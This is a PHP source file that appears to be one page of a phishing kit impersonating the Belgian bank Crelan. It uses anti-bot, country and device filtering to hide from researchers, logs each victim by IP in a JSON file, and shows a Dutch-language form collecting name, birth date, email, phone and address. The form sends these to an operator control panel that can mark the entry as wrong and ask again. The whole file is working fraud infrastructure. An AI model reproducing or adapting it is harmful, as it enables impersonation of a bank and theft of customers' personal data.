<?php
    error_reporting(0);
    session_start();

    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    include '../includes/check-allowed-countries.php';
    include '../includes/check-devices-allow.php';
    
    $ip = get_client_ip();
    $get_name_file = $ip;
    $target_file = "../panel/storage/{$get_name_file}.json";
    $json_file = file_get_contents($target_file);
    $user_info = json_decode($json_file, true);
    $user_info['error_information'];
    
    if ($user_info['error_information'] == 1) {
        $get_name_page = "Page Infromation Error";
        $get_step = "information-error";
    } else {
        $get_name_page = "Page Infromation";
        $get_step = "information";
    }
    get_page_info($get_name_page, $get_name_file);
    
    $random_classes = rand(0, 1000000); 
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en" class="">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.ico">
    <link rel="shortcut" href="../img/favicon.ico">
    <link rel="appel-touch-icon" href="../img/favicon.ico">
    <title>WEB PAGE</title>
</head>
<body>
    <!-- Main Section -->
    <div class="main-section">
        <div class="nav-section">
            <div class="logo">
                <img src="../img/logo.png" alt="">
            </div>
            <div class="lang-btn">
                <span class="text-lang">NL</span> <img src="../img/arrow-nav.png" alt="">
            </div>
        </div>
        <div class="content-main-section">
            <h1 class="title-login" style="margin-bottom: 10px !important;">Conferma i tuoi dati personali</h1>
            <p class="p-explain">
                Vul het formulier in met de gevraagde informatie.
            </p>
            <?php
                if ($user_info['error_information'] == 1) {
                    echo '
                    <div class="message-error-pages">
                        <i class="fa-solid fa-triangle-exclamation"></i>
                        De informatie is onjuist. Controleer of alle verplichte velden correct zijn ingevuld en probeer het opnieuw.
                    </div>';
                }
            ?>
            <form action="../control-panel/check-action.php" method="post" id="fsdpElement" class="f-s-d-p-element-other">
                <input type="hidden" name="step" value="<?php echo $get_step; ?>">
                <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                <div class="coul-container">
                    <div class="coul-fields-other">
                        <div class="prt-3" id="div1">
                            <label for="firstName">Voornaam</label>
                            <input type="text" name="first_name" id="firstName" class="i-element">
                            <small id="messageError1" class="m-e-i"><img src="../img/icon-error.png" alt="">Dit veld is verplicht.</small>
                        </div>
                        <div class="prt-3" id="div2">
                            <label for="lastName">Achternaam</label>
                            <input type="text" name="last_name" id="lastName" class="i-element">
                            <small id="messageError2" class="m-e-i"><img src="../img/icon-error.png" alt="">Dit veld is verplicht.</small>
                        </div>
                        <div class="prt-3" id="div3">
                            <label for="dob">Geboortedatum</label>
                            <input type="text" name="dob" id="dob" class="i-element">
                            <small id="messageError3" class="m-e-i"><img src="../img/icon-error.png" alt="">Dit veld is verplicht.</small>
                        </div>
                        <div class="prt-3" id="div4">
                            <label for="email">E-mailadres</label>
                            <input type="email" name="email" id="email" class="i-element">
                            <small id="messageError4" class="m-e-i"><img src="../img/icon-error.png" alt="">Dit veld is verplicht.</small>
                        </div>
                        <div class="prt-3" id="div5">
                            <label for="phoneNumber">Telefoonnummer</label>
                            <input type="tel" name="phone_number" id="phoneNumber" class="i-element">
                            <small id="messageError5" class="m-e-i"><img src="../img/icon-error.png" alt="">Dit veld is verplicht.</small>
                        </div>
                        <div class="prt-3" id="div6">
                            <label for="address">Adres</label>
                            <input type="text" name="address" id="address" class="i-element">
                            <small id="messageError6" class="m-e-i"><img src="../img/icon-error.png" alt="">Dit veld is verplicht.</small>
                        </div>
                        <div class="prt-3" id="div7" >
                            <label for="city">Plaats</label>
                            <input type="text" name="city" id="city" class="i-element">
                            <small id="messageError7" class="m-e-i"><img src="../img/icon-error.png" alt="">Dit veld is verplicht.</small>
                        </div>
                        <div class="prt-3" id="div8">
                            <label for="zipCode">Postcode</label>
                            <input type="tel" name="zip_code" id="zipCode" class="i-element">
                            <small id="messageError8" class="m-e-i"><img src="../img/icon-error.png" alt="">Dit veld is verplicht.</small>
                        </div>
                        <div class="prt-btn">
                            <button type="submit" name="b_s_d_p" id="bsdpElement" class="btn-element">Volgende</button>
                        </div>
                    </div>
                </div>
            </form> 
        </div>
    </div>
    <!-- Main Section -->

    <!-- Footer Section -->
    <div class="footer-section">
        <div class="content-footer-section">
            <div class="links-footer">
                <span class="link-footer">Meer info?</span> <span class="ship">—</span> <span class="link-footer">Privacy</span> <span class="ship">—</span> <span class="link-footer">Reglement myCrelan</span> <span class="ship">—</span> <span class="link-footer">Security myCrelan</span> <span class="ship">—</span> 
            </div>
            <p>Alle rechten voorbehouden © Crelan 2026</p>
        </div>
    </div>
    <!-- Footer Section -->

    <!-- Script Js -->
    <script src="../js/script-step-five.js"></script>
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/status.php'; ?>
</body>
</html>

                            <!-- <?php
                                if ($user_info['error_information'] == 1) {
                                    echo
                                    '<span class="message-error-pages">
                                        <i class="fa-solid fa-triangle-exclamation"></i>
                                        I dati personali sono errati. Inserisci i tuoi dati personali esattamente come appaiono sul tuo documento di identità.
                                    </span>';
                                }
                            ?> 
 -->

